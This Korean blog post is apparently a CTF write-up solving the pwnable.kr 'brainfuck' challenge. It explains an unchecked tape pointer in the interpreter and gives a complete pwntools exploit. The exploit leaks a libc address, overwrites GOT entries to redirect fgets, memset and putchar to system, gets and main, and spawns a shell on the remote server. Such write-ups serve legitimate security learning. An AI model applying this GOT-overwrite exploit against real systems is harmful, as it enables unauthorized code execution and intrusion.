---
layout: post
title:  "17. brainfuck"
subtitle: ""
date:   2018-12-22 18:36:39 +0900
categories: security
tags : pwnable
---


![1]({{"/assets/img/security/pwnable/17/1.png" | absolute_url}})

simple brain fuck language emulator

이 문장을 봐선 brain fuck이란 언어가 있는 것 같다.

전에 풀어봤던 문제 중 ws 언어와 비슷한 문제인가 싶어서 검색을 해봤다.


<br>

![2]({{"/assets/img/security/pwnable/17/2.png" | absolute_url}})

### [brain fuck?]({{"https://namu.wiki/w/BrainFuck"}})

<br>

귀찮아서 나무위키 읽었다.

음. 8개의 문자로 구성된 명령어 집합으로 튜링 머신이 하는 연산을 모두 수행할 수 있는 프로그래밍 언어라는 것 같다.

문제에서 제공해준 바이너리를 다운받아 로컬에서 분석했다.

<br>

![3]({{"/assets/img/security/pwnable/17/3.png" | absolute_url}})

bf 바이너리의 main 함수이다.

p라는 변수에 tape의 주소를 담는다.

`1024 크기`의 문자열을 선언하고 0으로 초기화하고 사용자로부터 입력을 받아 배열에 저장한다.

그리고 그 입력된 문자열의 각 문자를 `do_brainfuck()` 함수를 호출하며 인자로 전달한다.

`do_brainfuck()` 함수는 다음과 같이 생겼다.

<br>
![4]({{"/assets/img/security/pwnable/17/4.png" | absolute_url}})

아까 봤던 8개의 문자 중 6개`+ , - . < >` 가 구현되어있고 `[ ]`는 구현되지 않은 상태로 보인다.

`+ 문자`를 입력하면 p가 가리키는 값을 1 증가시키고

`, 문자`를 입력하면 p가 가리키는 문자를 사용자가 입력한 한 바이트의 값으로 변경하고

`- 문자`를 입력하면 p가 가리키는 값을 1 감소시키고

`< 문자`를 입력하면 p가 가리키는 주소의 값을 1바이트 감소시키고 (shift left)

`> 문자`를 입력하면 p가 가리키는 주소의 값을 1바이트 증가시킨다 (shift right)
 
<br>

![5]({{"/assets/img/security/pwnable/17/5.png" | absolute_url}})

p는 전역으로 선언되었고 tape의 주소를 담고있으니

`p = 0x0804A0A0` 라고 생각할 수 있겠다.

당연히 brain fuck 연산에 있어서 메모리 범위를 체크하지 않기 때문에 사용자가 입력하는 명령어에 의해

p를 특정 코드 주소 공간으로 이동하여 읽고 쓸 수 있게된다.

여기서 생각해볼 수 있는건 GOT 테이블.

GOT 테이블까지 이동하고 테이블에 있는 함수의 주소를 덮어쓰면 우리가 원하는 함수를 실행시킬 수 있을 것이다.

<br>

![6]({{"/assets/img/security/pwnable/17/6.png" | absolute_url}})

다행히 got 테이블이 근처에 있다.

p에 담긴 tape의 주소가 `0x0804A0A0`였고 GOT의 시작 주소는 `0x0804A000`이다. 

코드 상으로 p에 담긴 tape의 주소보다 `0xA0`만큼 위에 GOT가 존재한다.

GOT 테이블의 특정 함수들을, `system` 함수로 변경하여 쉘을 실행시킬 수 있을 것이다.

쉘을 실행시키기 위해선 `/bin/sh`과 같은 문자열을 입력할 수있어야 할 것이고, 때문에 `gets`과 같이 문자열을 입력받는 함수도 필요할거다.

즉, got 상의 두 함수를 `system`과 `gets` 함수로 바꿔야 된다고 볼 수있는데.

`gets`에서 인자로 전달된 인자를, `system`에서도 인자로 전달받아야 하기 때문에, 이 조건을 만족하는 함수들이 있는지 먼저 찾아야한다.

<br>

![7]({{"/assets/img/security/pwnable/17/7.png" | absolute_url}})

조건을 만족하는 함수가 바로 있다.

`memset`과 `fgets`

각 함수가 전달받는 인자의 개수는 상관 없다. 어차피 `gets`와 `system` 함수는 한 개의 인자만 전달받기 때문에, 

2번째 이후에 무슨 인자가 오든 덮어써진 함수들은 신경을 쓸 필요가 없다. 

말이 좀 어려울 수 있는데 정리하면.

<br>

![8]({{"/assets/img/security/pwnable/17/8.png" | absolute_url}})

`memset`을 `gets`, `fgets`를 `system` 함수로 덮어쓰면

`memset`은 한 개의 인자만 전달받기 때문에 `s` 인자만을 가져갈 것이고, `c`와 `n`은 무시된다.

마찬가지로 `system` 함수 또한 한 개의 인자만 전달받기 때문에 `s` 인자만 가져갈 것이고 `n`과 `stream`은 무시된다.

아무튼, 둘 다 공통된 `s`를 인자로 받기 때문에 이 함수들을 덮어쓰는 것으로 쉘은 실행시킬 수 있다.

덮어써준 다음엔 main 함수를 호출해줘야 한다.

이것 또한 `do_brainfuck()` 함수 내에서 호출되는 라이브러리 함수를 GOT overwrite 해서 호출할 수 있다.

<br>
![9]({{"/assets/img/security/pwnable/17/9.png" | absolute_url}})

난 여기서 `putchar` 함수를 main 함수의 주소로 덮어썼다.

이렇게되면 모든 `memset`, `fgets`, `putchar` 함수의 GOT를 overwrite 하는 명령어를 작성한 후에

main으로 덮어써진 `putchar`를 호출할 수 있는 `.` 명령어를 통해 main을 다시 호출할 수 있다.

정리하면
<br>
`memset`    -> `gets`

`fgets`     -> `system`

`putchar`   -> `main`

으로 변경해준다.

<br>

![10]({{"/assets/img/security/pwnable/17/10.png" | absolute_url}})

위에서부터 순서대로 하자.

`fgets` 함수의 주소는 `0x0804A010`

`memset` 함수의 주소는 `0x0804A02C`

`putchar` 함수의 주소는 `0x0804A030`

<br>

먼저 `<`를 `fgets` 함수의 주소가 쓰여진 got의 위치까지 이동하고

그 위치에서 `4바이트`를 읽으면 `fgets` 함수의 주소를 구할 수 있다.

이 구한 주소에서 라이브러리 상의 `fgets` 함수의 `offset`을 빼면 라이브러리가 올라간 base 주소를 구할 수 있다.

이렇게 구한 base 주소에 각 overwrite 할 함수 `gets, system 함수`의 `offset`을 더하여 덮어쓸 주소를 구한다.

덮어쓴 이후엔 `gets` 함수에 전달할 `/bin/sh`를 입력하면 쉘을 얻을 수 있다.


### ※ 서버의 응답 메시지를 기다릴 때 개행문자("\n")까지 기다려주지 않으면 이상한 값이 섞여들어가 공격이 되지 않는다...

{% highlight python %}
from pwn import *
 
fgets_addr      = 0x0804A010  # address of fgets's got table
memset_addr  = 0x0804A02C  # address of memset's got table
putchar_addr = 0x0804A030  # address of putchar's got table
tape_addr      = 0x0804A0A0  # address of pointer p
 
fgets_offset  = 0x0005E150 # to get base address of loaded library
gets_offset   = 0x0005F3E0 # offset of gets in library binary
system_offset = 0x0003ADA0 # offset of system in library binary
main_addr      = 0x08048671 # address of main function to overwrite putchar
 
def do_bf(s):
    payload  = "<" * (tape_addr - fgets_addr)             # move to address of fgets
    payload += ".>" * 4                                 # read address of fgets
    payload += "<" * 4                                  # rewind pointer
    payload += ",>" * 4                                 # overwrite address of fgets to system
    payload += ">" * (memset_addr - fgets_addr - 4)     # move to address of memset
    payload += ",>" * 4                                    # overwrite address of memset to gets
    payload += ">" * (putchar_addr - memset_addr -4)    # move to address of putchar
    payload += ",>" * 4                                    # overwrite address of putchar to main
    payload += "."                                        # call putchar (=main)
    s.sendline(payload)
 
 
def main():
    s = remote("pwnable.kr", 9001)
 
    #rcv = s.recvuntil(']')                            # you should also wait '\n'....
    rcv = s.recvuntil(']\n')
    print(rcv)
    
    do_bf(s)                                        # send payload to do brain fuck
 
    loaded_fgets_addr = u32(s.recvn(4))             # read address of fgets got address
 
    base_addr     = loaded_fgets_addr - fgets_offset     # get base address of loaded binary
    gets_addr     = base_addr + gets_offset            # get address of gets in memory
    system_addr = base_addr + system_offset            # get address of system in memory
 
    s.send(p32(system_addr))                        # overwrite fgets to system
    s.send(p32(gets_addr))                            # overwrite memset to gets
    s.send(p32(main_addr))                            # overwrite putchar to main
    s.sendline("/bin/sh")                            # pass argument to gets function
 
    s.interactive()                                    # get shell
 
main()
{% endhighlight %}
<br><br>
![11]({{"/assets/img/security/pwnable/17/11.png" | absolute_url}})

<br><br>
{% highlight bash %}
BrainFuck? what a weird language..
{% endhighlight %}


